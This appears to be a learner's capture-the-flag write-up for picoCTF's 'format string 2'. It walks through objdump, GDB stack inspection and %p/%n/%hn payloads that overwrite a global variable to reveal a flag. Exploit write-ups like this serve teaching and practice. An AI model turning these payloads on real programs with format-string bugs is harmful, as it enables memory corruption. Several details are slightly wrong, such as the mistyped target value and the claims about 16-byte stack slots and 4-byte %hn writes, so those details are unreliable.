# Writeup: format string 2

## Overview

This challenge involves exploiting a format string vulnerability to change a global variable in a program. The goal is to manipulate the variable `sus` to reveal a hidden flag.

## Analysis

### Code Overview

1. Local Variable Initialisation

The program initialise a variable `sus` with the value `0x21737573`:

```c
int sus = 0x21737573;
```

2. Main Function

- The `main` function prompts the user to input a string and prints it using `printf(buf)` without specifying the input type.
- The program will output the flag if the value of `sus` is `0x67617c66`. 

```c
int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
### Vulnerability

1. The use of `printf(buf)` without a format specifier leading to format string vulnerability.

## Exploitation Strategy

The goal is to exploit the format string vulnerability to overwrite the value of `sus` and reveal the flag.

1. Determine the address of the variable `sus`.

2. Determine the position of user input on the stack.

3. Craft a payload that writes the desired value to `sus`.

## Exploitation steps

1. Determine the address of the variable `sus`.

- Using objdump:

```terminal
$ objdump -d vuln | grep sus 
  401273:       8b 05 e7 2d 00 00       mov    0x2de7(%rip),%eax        # 404060 <sus>
  4012df:       8b 05 7b 2d 00 00       mov    0x2d7b(%rip),%eax        # 404060 <sus>
```

- The address of `sus` is `0x404060`.

2. Determine the stack location of the input using gdb.

- Run the program in GDB:

```terminal
$ gdb vuln
```

- `disas main` to see the suitable timing to set breakpoint:

```gdb
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004011f6 <+0>:     endbr64
   0x00000000004011fa <+4>:     push   rbp
   0x00000000004011fb <+5>:     mov    rbp,rsp
   0x00000000004011fe <+8>:     sub    rsp,0x450
   0x0000000000401205 <+15>:    mov    edi,0x402008
   0x000000000040120a <+20>:    call   0x4010b0 <puts@plt>
   0x000000000040120f <+25>:    mov    rax,QWORD PTR [rip+0x2e52]        # 0x404068 <stdout@GLIBC_2.2.5>
   0x0000000000401216 <+32>:    mov    rdi,rax
   0x0000000000401219 <+35>:    call   0x4010e0 <fflush@plt>
   0x000000000040121e <+40>:    lea    rax,[rbp-0x410]
   0x0000000000401225 <+47>:    mov    rsi,rax
   0x0000000000401228 <+50>:    mov    edi,0x40206e
   0x000000000040122d <+55>:    mov    eax,0x0
   0x0000000000401232 <+60>:    call   0x401100 <__isoc99_scanf@plt>
   0x0000000000401237 <+65>:    mov    edi,0x402075
   0x000000000040123c <+70>:    mov    eax,0x0
   0x0000000000401241 <+75>:    call   0x4010c0 <printf@plt>
   0x0000000000401246 <+80>:    lea    rax,[rbp-0x410]
   0x000000000040124d <+87>:    mov    rdi,rax
   0x0000000000401250 <+90>:    mov    eax,0x0
   0x0000000000401255 <+95>:    call   0x4010c0 <printf@plt>
   0x000000000040125a <+100>:   mov    edi,0xa
   0x000000000040125f <+105>:   call   0x4010a0 <putchar@plt>
   0x0000000000401264 <+110>:   mov    rax,QWORD PTR [rip+0x2dfd]        # 0x404068 <stdout@GLIBC_2.2.5>
   0x000000000040126b <+117>:   mov    rdi,rax
   0x000000000040126e <+120>:   call   0x4010e0 <fflush@plt>
   0x0000000000401273 <+125>:   mov    eax,DWORD PTR [rip+0x2de7]        # 0x404060 <sus>
   0x0000000000401279 <+131>:   cmp    eax,0x67616c66
   0x000000000040127e <+136>:   jne    0x4012df <main+233>
   0x0000000000401280 <+138>:   mov    edi,0x402090
   0x0000000000401285 <+143>:   call   0x4010b0 <puts@plt>
   0x000000000040128a <+148>:   mov    esi,0x4020d6
   0x000000000040128f <+153>:   mov    edi,0x4020d8
   0x0000000000401294 <+158>:   call   0x4010f0 <fopen@plt>
   0x0000000000401299 <+163>:   mov    QWORD PTR [rbp-0x8],rax
   0x000000000040129d <+167>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004012a1 <+171>:   lea    rax,[rbp-0x450]
   0x00000000004012a8 <+178>:   mov    esi,0x40
   0x00000000004012ad <+183>:   mov    rdi,rax
   0x00000000004012b0 <+186>:   call   0x4010d0 <fgets@plt>
   0x00000000004012b5 <+191>:   lea    rax,[rbp-0x450]
   0x00000000004012bc <+198>:   mov    rsi,rax
   0x00000000004012bf <+201>:   mov    edi,0x4020e1
   0x00000000004012c4 <+206>:   mov    eax,0x0
   0x00000000004012c9 <+211>:   call   0x4010c0 <printf@plt>
   0x00000000004012ce <+216>:   mov    rax,QWORD PTR [rip+0x2d93]        # 0x404068 <stdout@GLIBC_2.2.5>
   0x00000000004012d5 <+223>:   mov    rdi,rax
   0x00000000004012d8 <+226>:   call   0x4010e0 <fflush@plt>
   0x00000000004012dd <+231>:   jmp    0x40130f <main+281>
   0x00000000004012df <+233>:   mov    eax,DWORD PTR [rip+0x2d7b]        # 0x404060 <sus>
   0x00000000004012e5 <+239>:   mov    esi,eax
   0x00000000004012e7 <+241>:   mov    edi,0x4020e4
   0x00000000004012ec <+246>:   mov    eax,0x0
   0x00000000004012f1 <+251>:   call   0x4010c0 <printf@plt>
   0x00000000004012f6 <+256>:   mov    edi,0x4020f0
   0x00000000004012fb <+261>:   call   0x4010b0 <puts@plt>
   0x0000000000401300 <+266>:   mov    rax,QWORD PTR [rip+0x2d61]        # 0x404068 <stdout@GLIBC_2.2.5>
   0x0000000000401307 <+273>:   mov    rdi,rax
   0x000000000040130a <+276>:   call   0x4010e0 <fflush@plt>
   0x000000000040130f <+281>:   mov    eax,0x0
   0x0000000000401314 <+286>:   leave
   0x0000000000401315 <+287>:   ret
End of assembler dump.
gef➤  b *0x000000000040126e
Breakpoint 1 at 0x40126e
```
- Break point is set after input.

- Run and inspect the stack.

```gdb
gef➤  run
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
AAAAAAAA
Here's your input: AAAAAAAA
gef➤  tele
0x00007fffffffd8e0│+0x0000: 0x00007ffff7fcb7b0  →  0x000e001100000243    ← $rsp
0x00007fffffffd8e8│+0x0008: 0x00007ffff7ffdab0  →  0x00007ffff7fcb000  →  0x03010102464c457f
0x00007fffffffd8f0│+0x0010: 0x00007fffffffda10  →  0x00007ffff7dcdb88  →  0x00000bdf00000bd9
0x00007fffffffd8f8│+0x0018: 0x00007ffff7fd4fc8  →  <_dl_lookup_symbol_x+296> add rsp, 0x30
0x00007fffffffd900│+0x0020: 0x0000000000000001
0x00007fffffffd908│+0x0028: 0x00007fffffffda40  →  0x0000000000000001
0x00007fffffffd910│+0x0030: 0x0000000000000000
0x00007fffffffd918│+0x0038: 0x00007ffff7fcbca8  →  0x0000000000031fe8
0x00007fffffffd920│+0x0040: "AAAAAAAA"
0x00007fffffffd928│+0x0048: 0x00007ffff7fcb700  →  0x0000000000000015
```

- The input is on the 9th of the stack but in 64-bit the first 5 places of the stack are registers.

- So the input is actually on the 14th position of the stack.

3. Crafting payload

- First, verify the stack location of the input using `%p`.

```terminal
$ echo 'AAAAAAAA,%14$p' | ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: AAAAAAAA,0x4141414141414141
sus = 0x21737573
You can do better!
```

- `%n` writes the total number of character printed so far to the target.

- So I need to input the address of the variable `sus` on the stack.

```terminal
$ echo '\x60\x40\x40\x00\x00\x00\x00\x00,%14$p' | ./vuln 
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: `@@
sus = 0x21737573
You can do better!
```

- This cannot work somehow, I suspect the problem is on the byte input (Maybe \x00 ?).

- Luckily it works when I inverted the payload.

```terminal
$ echo '%15$p,\x60\x40\x40\x00\x00\x00\x00\x00' | ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 0x40,`@@
sus = 0x21737573
You can do better!
```

- But I expect the output to be 0x404060, the problem occur because `%15$p,` which are 6 bytes fill the stack too (Every stack stores 16 bytes).

```terminal
$ echo '%15$p,AA\x60\x40\x40\x00\x00\x00\x00\x00' | ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 0x404060,AA`@@
sus = 0x21737573
You can do better!
```

- Now the whole payload is 16 bytes so finally 0x404060 is the output.

- So after this I always make the payload multiple of 8 and check using `%p`.

- `%n` write the data in integer so I check the integer value of `0x67616c66` (The target value of `sus`).

```terminal
$ python
>>> 0x67616c66
1734437990
```

- Print out random character using `%d` and overwrite `sus` using `%n`.

```terminal
$ echo '%1734437989d,%17$n,AAAAA\x60\x40\x40\x00\x00\x00\x00\x00' | ./vuln
I have NO clue how you did that, you must be a wizard. Here you go...
u got the flag
```

- Only 1734437989 characters print out because need to count in that `,` is also get printed out.

- It takes some time, so overwrite the data 4 bytes by 4 bytes using `%hn` is more efficient.

```terminal
$ echo '%26464d,%19$hn%1285d%18$hn,AAAAA\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00' | 
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_741fa290}
```
## Conclusion
This challenge requires an understanding of stack structure in 64-bit programs and exploiting format string vulnerabilities to overwrite values and retrieve flags.
